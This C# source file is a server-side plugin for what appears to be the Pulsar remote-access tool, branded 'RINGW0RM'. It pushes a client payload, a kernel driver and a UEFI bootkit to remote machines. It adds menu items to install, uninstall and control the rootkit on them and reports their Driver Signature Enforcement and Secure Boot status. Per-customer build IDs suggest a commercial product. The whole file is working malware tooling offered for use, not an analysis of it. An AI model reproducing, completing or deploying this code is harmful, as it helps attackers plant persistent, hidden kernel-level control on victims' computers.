using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using Pulsar.Server.Plugins;
using Pulsar.Server.Networking;
using Pulsar.Server.Messages;
using Pulsar.Plugin.Ring0.Common;
using MessagePack;

namespace Pulsar.Plugin.Ring0.Server
{
    /// <summary>
    /// RINGW0RM Ring0 Server Plugin
    /// Provides kernel rootkit deployment and control via Elysium bootkit DSE bypass
    /// </summary>
    public class Ring0ServerPlugin : IServerPlugin
    {
        public string Name => "RINGW0RM Plugin";
        public Version Version => new Version(2, 0, 0);
        public string Description => "RINGW0RM Ring0 kernel rootkit with Elysium DSE bypass";
        public string Type => "Rootkit";
        public bool AutoLoadToClients => false;

        private IServerContext _context;
        private byte[] _clientPluginBytes;
        private byte[] _driverBytes;
        private byte[] _bootkitBytes;
        private Dictionary<string, RootkitStatus> _clientStatus = new Dictionary<string, RootkitStatus>();
        private ConcurrentDictionary<string, RootkitWindow> _openWindows = new ConcurrentDictionary<string, RootkitWindow>();
        private ConcurrentDictionary<string, Client> _activeClients = new ConcurrentDictionary<string, Client>();

        // ================================================================
        // CUSTOMER DEBUG LOGGING
        // Enabled via CUSTOMER_DEBUG define for troubleshooting builds
        // ================================================================
        
        [Conditional("CUSTOMER_DEBUG")]
        private void LogDebug(string component, string message)
        {
            _context?.Log($"[DEBUG:{component}] {message}");
        }
        
        [Conditional("CUSTOMER_DEBUG")]
        private void LogDebugError(string component, string operation, Exception ex)
        {
            string errorCode = $"ERR-{Math.Abs(ex.GetHashCode()) % 10000:D4}";
            _context?.Log($"[DEBUG:{component}] {operation}: FAILED [{errorCode}]");
            _context?.Log($"[DEBUG:{component}]   → {ex.GetType().Name}: {ex.Message}");
        }

        public void Initialize(IServerContext context)
        {
            _context = context;
            
            LogDebug("INIT", "Starting plugin initialization...");
            
            LoadResources();
            RegisterMenuItems();
            
            UniversalPluginResponseHandler.ResponseReceived += HandleResponse;

            _context.Log($"{Name} v{Version} loaded");
            LogDebug("INIT", "Plugin initialization complete");
            
            // Display Customer ID for verification
            LogCustomerId();
        }
        
        private void LogCustomerId()
        {
            // This constant is replaced per-customer by BuildService
            const string customerId = "XXXX-XXXX-XXXX-XXXX";
            
            if (customerId == "XXXX-XXXX-XXXX-XXXX")
            {
                // Dev build - no customer ID set
                return;
            }
            
            _context.Log("╔═══════════════════════════════════════════════════════════════╗");
            _context.Log("║     RINGW0RM - Your Customer Verification ID                  ║");
            _context.Log("╠═══════════════════════════════════════════════════════════════╣");
            _context.Log($"║     >>> {customerId} <<<                              ║");
            _context.Log("╠═══════════════════════════════════════════════════════════════╣");
            _context.Log("║  SAVE THIS ID! Use it to verify your purchase for support.    ║");
            _context.Log("╚═══════════════════════════════════════════════════════════════╝");
        }

        private void LoadResources()
        {
            string basePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            
            // Load client plugin
            try
            {
                string pluginPath = Path.Combine(basePath, "Pulsar.Plugin.Ring0.Client.dll");
                if (File.Exists(pluginPath))
                {
                    _clientPluginBytes = File.ReadAllBytes(pluginPath);
                    _context.Log($"Client plugin loaded: {_clientPluginBytes.Length} bytes");
                }
                else
                {
                    _context.Log($"WARNING: Client plugin not found: {pluginPath}");
                }
            }
            catch (Exception ex)
            {
                _context.Log($"Error loading client plugin: {ex.Message}");
            }

            // Load driver
            try
            {
                string driverPath = Path.Combine(basePath, "ringw0rm.sys");
                if (File.Exists(driverPath))
                {
                    _driverBytes = File.ReadAllBytes(driverPath);
                    _context.Log($"Driver loaded: {_driverBytes.Length} bytes");
                }
            }
            catch { }

            // Load bootkit
            try
            {
                string bootkitPath = Path.Combine(basePath, "ringw0rm.efi");
                if (File.Exists(bootkitPath))
                {
                    _bootkitBytes = File.ReadAllBytes(bootkitPath);
                    _context.Log($"Bootkit loaded: {_bootkitBytes.Length} bytes");
                }
            }
            catch { }
        }

        private void RegisterMenuItems()
        {
            // Bootkit status check (pre-reboot verification)
            _context.AddClientContextMenuItem(
                "RINGW0RM",
                "Check Bootkit Status",
                OnCheckBootkit);

            // Installation/Uninstallation
            _context.AddClientContextMenuItem(
                "RINGW0RM",
                "Install Rootkit",
                OnInstall);

            _context.AddClientContextMenuItem(
                "RINGW0RM",
                "Uninstall Rootkit",
                OnUninstall);

            // Control Panel (has all other features)
            _context.AddClientContextMenuItem(
                "RINGW0RM",
                "Open Control Panel",
                OnOpenGui);
        }

        private void HandleResponse(PluginResponse response)
        {
            if (response.PluginId != Ring0Commands.PluginId) return;

            try
            {
                string clientKey = response.Client.EndPoint.ToString();
                
                // Log the command result first
                _context.Log($"[Ring0] {response.Command} on {clientKey}: " +
                            $"{(response.Success ? "SUCCESS" : "FAILED")} - {response.Message}");

                // Handle response data based on command type
                if (response.Data != null && response.Data.Length > 0)
                {
                    if (response.Command == Ring0Commands.CMD_CHECK_STATUS)
                    {
                        // Try to deserialize status
                        try
                        {
                            var status = MessagePackSerializer.Deserialize<RootkitStatus>(response.Data);
                            _clientStatus[clientKey] = status;
                            
                            _context.Log($"[Ring0] {clientKey} - Driver: {(status.DriverConnected ? "Connected" : status.DriverLoaded ? "Loaded" : "Not Loaded")}, " +
                                        $"DSE: {(status.DseEnabled ? "ON" : "OFF")}, SecureBoot: {(status.SecureBootEnabled ? "ON" : "OFF")}, " +
                                        $"Build: {status.WindowsBuild} ({(status.BuildSupported ? "SUPPORTED" : "UNSUPPORTED")})");

                            // Update open window if exists
                            if (_openWindows.TryGetValue(clientKey, out var window))
                            {
                                try
                                {
                                    // Check if window's dispatcher is still valid
                                    if (!window.Dispatcher.HasShutdownStarted)
                                    {
                                        window.UpdateStatus(status);
                                    }
                                    else
                                    {
                                        _openWindows.TryRemove(clientKey, out _);
                                    }
                                }
                                catch (ObjectDisposedException)
                                {
                                    _openWindows.TryRemove(clientKey, out _);
                                }
                            }
                        }
                        catch { }
                    }
                    else
                    {
                        // Display detailed logs from all commands with Data
                        try
                        {
                            string logOutput = Encoding.UTF8.GetString(response.Data);
                            if (!string.IsNullOrWhiteSpace(logOutput))
                            {
                                // Split into lines and log each
                                foreach (var line in logOutput.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries))
                                {
                                    _context.Log($"[Ring0] {line}");
                                }
                            }
                        }
                        catch { }
                    }
                }

                // Update window with response
                if (_openWindows.TryGetValue(clientKey, out var controlWindow))
                {
                    try
                    {
                        // Check if window's dispatcher is still valid
                        if (!controlWindow.Dispatcher.HasShutdownStarted)
                        {
                            _context.Log($"[Ring0] Forwarding response to Control Panel window for {clientKey}");
                            controlWindow.HandleResponse(response.Command, response.Success, response.Message);
                        }
                        else
                        {
                            _openWindows.TryRemove(clientKey, out _);
                        }
                    }
                    catch (ObjectDisposedException)
                    {
                        _openWindows.TryRemove(clientKey, out _);
                    }
                }
                else
                {
                    _context.Log($"[Ring0] No Control Panel window open for {clientKey} (windows: {_openWindows.Count})");
                }
            }
            catch (Exception ex)
            {
                _context.Log($"[Ring0] Response error: {ex.Message}");
            }
        }

        private void DeployPlugin(Client client)
        {
            if (_clientPluginBytes == null || _clientPluginBytes.Length == 0)
            {
                _context.Log("[Ring0] Client plugin not loaded!");
                return;
            }

            // Prepare init data with embedded driver/bootkit
            byte[] initData = null;
            if (_driverBytes != null && _driverBytes.Length > 0)
            {
                int totalLen = 4 + _driverBytes.Length + (_bootkitBytes?.Length ?? 0);
                initData = new byte[totalLen];
                BitConverter.GetBytes(_driverBytes.Length).CopyTo(initData, 0);
                _driverBytes.CopyTo(initData, 4);
                if (_bootkitBytes != null)
                {
                    _bootkitBytes.CopyTo(initData, 4 + _driverBytes.Length);
                }
            }

            PushSender.LoadUniversalPlugin(
                client,
                Ring0Commands.PluginId,
                _clientPluginBytes,
                initData,
                "Pulsar.Plugin.Ring0.Client.Ring0ClientPlugin",
                "Initialize");
        }

        private void SendCommand(string clientKey, string command, byte[] data)
        {
            // Find client by endpoint
            // This is a simplified lookup - actual implementation depends on Pulsar's client tracking
            _context.Log($"[Ring0] Sending {command} to {clientKey}");
        }

        private void OnCheckStatus(IReadOnlyList<Client> clients)
        {
            if (clients == null || clients.Count == 0) return;

            foreach (var client in clients)
            {
                DeployPlugin(client);
                
                PushSender.ExecuteUniversalCommand(
                    client,
                    Ring0Commands.PluginId,
                    Ring0Commands.CMD_CHECK_STATUS,
                    null);
            }

            _context.Log($"[Ring0] Checking status on {clients.Count} client(s)");
        }

        private void OnCheckDse(IReadOnlyList<Client> clients)
        {
            if (clients == null || clients.Count == 0) return;

            foreach (var client in clients)
            {
                DeployPlugin(client);
                
                PushSender.ExecuteUniversalCommand(
                    client,
                    Ring0Commands.PluginId,
                    Ring0Commands.CMD_CHECK_DSE,
                    null);
            }
        }

        private void OnCheckSecureBoot(IReadOnlyList<Client> clients)
        {
            if (clients == null || clients.Count == 0) return;

            foreach (var client in clients)
            {
                DeployPlugin(client);
                
                PushSender.ExecuteUniversalCommand(
                    client,
                    Ring0Commands.PluginId,
                    Ring0Commands.CMD_CHECK_SECURE_BOOT,
                    null);
            }
        }

        private void OnCheckBootkit(IReadOnlyList<Client> clients)
        {
            if (clients == null || clients.Count == 0) return;

            foreach (var client in clients)
            {
                DeployPlugin(client);
                
                PushSender.ExecuteUniversalCommand(
                    client,
                    Ring0Commands.PluginId,
                    Ring0Commands.CMD_CHECK_BOOTKIT,
                    null);
            }

            _context.Log($"[Ring0] Checking bootkit status on {clients.Count} client(s)");
        }

        private void OnCheckRootkit(IReadOnlyList<Client> clients)
        {
            if (clients == null || clients.Count == 0) return;

            foreach (var client in clients)
            {
                DeployPlugin(client);
                
                PushSender.ExecuteUniversalCommand(
                    client,
                    Ring0Commands.PluginId,
                    Ring0Commands.CMD_CHECK_ROOTKIT,
                    null);
            }

            _context.Log($"[Ring0] Checking rootkit status on {clients.Count} client(s)");
        }

        private void OnStartRootkit(IReadOnlyList<Client> clients)
        {
            if (clients == null || clients.Count == 0) return;

            foreach (var client in clients)
            {
                DeployPlugin(client);
                
                PushSender.ExecuteUniversalCommand(
                    client,
                    Ring0Commands.PluginId,
                    Ring0Commands.CMD_START_ROOTKIT,
                    null);
            }

            _context.Log($"[Ring0] Starting rootkit on {clients.Count} client(s)");
        }

        private void OnInstall(IReadOnlyList<Client> clients)
        {
            if (clients == null || clients.Count == 0) return;

            // Prepare driver data to send
            byte[] driverData = _driverBytes;
            if (driverData == null || driverData.Length == 0)
            {
                // Prompt for driver file
                _context.MainForm.Invoke(new Action(() =>
                {
                    using (var ofd = new OpenFileDialog())
                    {
                        ofd.Filter = "Driver Files (*.sys)|*.sys|All Files (*.*)|*.*";
                        ofd.Title = "Select ringw0rm.sys";
                        
                        if (ofd.ShowDialog() == DialogResult.OK)
                        {
                            driverData = File.ReadAllBytes(ofd.FileName);
                        }
                    }
                }));
            }

            if (driverData == null || driverData.Length == 0)
            {
                _context.Log("[Ring0] No driver data - install cancelled");
                return;
            }

            foreach (var client in clients)
            {
                DeployPlugin(client);
                
                PushSender.ExecuteUniversalCommand(
                    client,
                    Ring0Commands.PluginId,
                    Ring0Commands.CMD_INSTALL_ROOTKIT,
                    driverData);
            }

            _context.Log($"[Ring0] Installing rootkit on {clients.Count} client(s)");
        }

        private void OnUninstall(IReadOnlyList<Client> clients)
        {
            if (clients == null || clients.Count == 0) return;

            foreach (var client in clients)
            {
                PushSender.ExecuteUniversalCommand(
                    client,
                    Ring0Commands.PluginId,
                    Ring0Commands.CMD_UNINSTALL_ROOTKIT,
                    null);
            }

            _context.Log($"[Ring0] Uninstalling rootkit from {clients.Count} client(s)");
        }

        private void OnOpenGui(IReadOnlyList<Client> clients)
        {
            if (clients == null || clients.Count == 0) return;

            foreach (var client in clients)
            {
                string clientKey = client.EndPoint.ToString();
                LogDebug("WINDOW", $"OnOpenGui called for {clientKey}");

                // Track client for dynamic lookup (fixes Issue 2 - stale client after reconnect)
                _activeClients[clientKey] = client;

                // Check if window already open - but be very careful about dispatcher state
                if (_openWindows.TryGetValue(clientKey, out var existingWindow))
                {
                    LogDebug("WINDOW", $"Found existing window for {clientKey}, checking validity...");
                    bool windowIsValid = false;
                    
                    try
                    {
                        // CRITICAL: Check dispatcher state BEFORE calling Invoke
                        bool dispatcherActive = !existingWindow.Dispatcher.HasShutdownStarted && 
                                                !existingWindow.Dispatcher.HasShutdownFinished;
                        LogDebug("WINDOW", $"Dispatcher active: {dispatcherActive}");
                        
                        if (dispatcherActive)
                        {
                            // Use BeginInvoke to avoid blocking and potential deadlocks
                            existingWindow.Dispatcher.BeginInvoke(new Action(() =>
                            {
                                try
                                {
                                    if (existingWindow.IsLoaded && existingWindow.IsVisible)
                                    {
                                        existingWindow.Activate();
                                        LogDebug("WINDOW", "Activated existing window");
                                    }
                                }
                                catch { /* Window closing - ignore */ }
                            }));
                            windowIsValid = true;
                        }
                    }
                    catch (Exception ex)
                    {
                        // Dispatcher is dead or window is disposed
                        _context.Log($"[Ring0] Existing window invalid: {ex.Message}");
                        LogDebugError("WINDOW", "Dispatcher check", ex);
                    }
                    
                    if (windowIsValid)
                    {
                        LogDebug("WINDOW", $"Reusing existing window for {clientKey}");
                        continue; // Skip creating new window
                    }
                    else
                    {
                        // Window is dead - remove it from dictionary
                        _openWindows.TryRemove(clientKey, out _);
                        _context.Log($"[Ring0] Removed dead window for {clientKey}, creating new one");
                        LogDebug("WINDOW", $"Removed dead window, open windows count: {_openWindows.Count}");
                    }
                }

                // Deploy plugin first
                DeployPlugin(client);

                // Get current status
                RootkitStatus status = null;
                if (_clientStatus.TryGetValue(clientKey, out var cached))
                {
                    status = cached;
                }
                else
                {
                    status = new RootkitStatus();
                    // Request status update
                    PushSender.ExecuteUniversalCommand(
                        client,
                        Ring0Commands.PluginId,
                        Ring0Commands.CMD_CHECK_STATUS,
                        null);
                }

                // Create and show WPF window on a new STA thread
                var capturedStatus = status;
                var capturedKey = clientKey;
                var capturedContext = _context; // Capture for thread
                
                LogDebug("THREAD", $"Creating new STA thread for window {capturedKey}");

                var thread = new System.Threading.Thread(() =>
                {
                    LogDebug("THREAD", $"STA thread started for {capturedKey}");
                    try
                    {
                        LogDebug("WINDOW", $"Creating RootkitWindow for {capturedKey}");
                        var window = new RootkitWindow(
                            capturedKey,
                            capturedStatus,
                            (cid, cmd, data) =>
                            {
                                try
                                {
                                    // Dynamic client lookup (Issue 2 fix - get current client, not captured)
                                    if (!_activeClients.TryGetValue(cid, out var currentClient))
                                    {
                                        _context.Log($"[Ring0] ERROR: No active client for {cid} - client may have disconnected");
                                        return;
                                    }
                                    _context.Log($"[Ring0] Sending command '{cmd}' to {cid}...");
                                    PushSender.ExecuteUniversalCommand(
                                        currentClient,
                                        Ring0Commands.PluginId,
                                        cmd,
                                        data);
                                    _context.Log($"[Ring0] Command '{cmd}' sent successfully");
                                }
                                catch (Exception ex)
                                {
                                    _context.Log($"[Ring0] ERROR sending command: {ex.Message}");
                                }
                            });
                        
                        LogDebug("WINDOW", $"RootkitWindow created for {capturedKey}");

                        // CRITICAL: Remove from dict FIRST in Closed handler to prevent race
                        window.Closed += (s, e) =>
                        {
                            LogDebug("WINDOW", $"Window.Closed event fired for {capturedKey}");
                            // Remove IMMEDIATELY - before any other processing
                            _openWindows.TryRemove(capturedKey, out _);
                            LogDebug("WINDOW", $"Window removed from dictionary, count: {_openWindows.Count}");
                            
                            // Now safe to shutdown dispatcher
                            try
                            {
                                if (!window.Dispatcher.HasShutdownStarted)
                                {
                                    LogDebug("THREAD", $"Shutting down dispatcher for {capturedKey}");
                                    window.Dispatcher.InvokeShutdown();
                                }
                            }
                            catch { /* Already shutting down */ }
                        };

                        // Add to dictionary BEFORE showing
                        _openWindows[capturedKey] = window;
                        LogDebug("WINDOW", $"Window added to dictionary, count: {_openWindows.Count}");
                        
                        LogDebug("WINDOW", $"Calling window.Show() for {capturedKey}");
                        window.Show();
                        LogDebug("WINDOW", $"Window.Show() complete, entering Dispatcher.Run() for {capturedKey}");
                        System.Windows.Threading.Dispatcher.Run();
                        LogDebug("THREAD", $"Dispatcher.Run() returned for {capturedKey}");
                    }
                    catch (Exception ex)
                    {
                        _context.Log($"[Ring0] ERROR creating window: {ex.Message}");
                        LogDebugError("WINDOW", "Window creation/show", ex);
                        _openWindows.TryRemove(capturedKey, out _);
                    }
                });

                thread.SetApartmentState(System.Threading.ApartmentState.STA);
                thread.IsBackground = true;
                LogDebug("THREAD", $"Starting thread for {capturedKey}");
                thread.Start();
                LogDebug("THREAD", $"Thread started for {capturedKey}");
            }
        }

        // Update open window with new status
        private void UpdateWindowStatus(string clientKey, RootkitStatus status)
        {
            if (_openWindows.TryGetValue(clientKey, out var window))
            {
                window.UpdateStatus(status);
            }
        }
    }
}
